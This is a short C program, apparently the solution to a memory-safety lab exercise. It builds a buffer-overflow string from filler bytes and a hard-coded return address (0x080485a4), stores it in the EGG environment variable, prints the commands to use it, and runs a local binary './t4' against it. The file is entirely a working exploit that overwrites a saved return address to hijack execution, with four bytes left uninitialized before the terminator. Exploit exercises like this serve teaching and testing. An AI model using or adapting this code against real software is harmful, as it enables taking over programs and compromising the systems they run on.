#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
        char overflow_str[37];
        unsigned int retaddr = 0x080485a4;

        memset(overflow_str, 'A', 16);

        memset(overflow_str + 16, 'F', 4);

        // Fill the 8-byte padding
        memset(overflow_str + 20, 'P', 8);

        // Set the return address (4 bytes)
        memcpy(overflow_str + 28, &retaddr, 4);

        // Null terminate
        overflow_str[36] = '\0';

        setenv("EGG", overflow_str, 1);

        printf("Run these commands:\n");
        printf("export EGG=\"%s\"\n", overflow_str);
        printf("./t4 $EGG\n");

        system("./t4 $EGG");

        return 0;
}
